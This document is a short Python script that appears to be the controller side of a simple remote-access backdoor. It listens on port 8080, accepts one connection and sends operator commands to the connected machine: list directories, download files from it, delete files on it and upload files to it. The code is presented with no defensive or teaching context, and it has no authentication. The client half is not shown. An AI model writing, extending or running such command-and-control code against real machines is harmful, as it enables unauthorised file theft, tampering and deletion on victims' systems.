import os
import socket

s = socket.socket()
host = socket.gethostname()
port = 8080
s.bind((host,port))
print("")
print(" Server is currently running 0 ", host)
print("")
print("Waiting for any incoming connection ... ")
s.listen(1)
conn, adr = s.accept()
print("")
print(adr," Has connected to the server Successfuly")

while 1:
    print("")
    command = input(str("command >> "))
    if command == "view_cwd":
        conn.send(command.encode())
        print("")
        print("command sent waiting for execution")
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print("command output : ", files)
    elif command == "costum_dirr":
        conn.send(command.encode())
        print("")
        user_input = input(str("costum Dir : "))
        conn.send(user_input.encode())
        print("")
        print("Command has been sent")
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print("Costum Dir : ",files)
    elif command == "dwnd_file":
        conn.send(command.encode())
        filepath = input(str("Path File with File Name : "))
        conn.send(filepath.encode())
        file = conn.recv(100000)
        print("")
        filename = input(str("file name + extension : "))
        new_file = open(filename,"wb")
        new_file.write(file)
        new_file.close()
        print("")
        print(filename,"has been dwnd and saved ")
        print("")
    
    elif command == "rmv_file":
        conn.send(command.encode())
        fd = input(str("Path of file name or directory : "))
        conn.send(fd.encode())
        print("")
        print("command has been executed successfuly")
    
    elif command == "send_file":
        conn.send(command.encode())
        fs = input(str("File name and directory"))
        fn  = input(str("File name to sent"))
        data = open(fs,"rb")
        fd = data.read(7000)
        #size will be change when size file is big 
        conn.send(fn.encode())
        print(fs,"has been sent successfuly")
        conn.send(fd)
        
    else:
        print("")
        print("command not Found")


    
    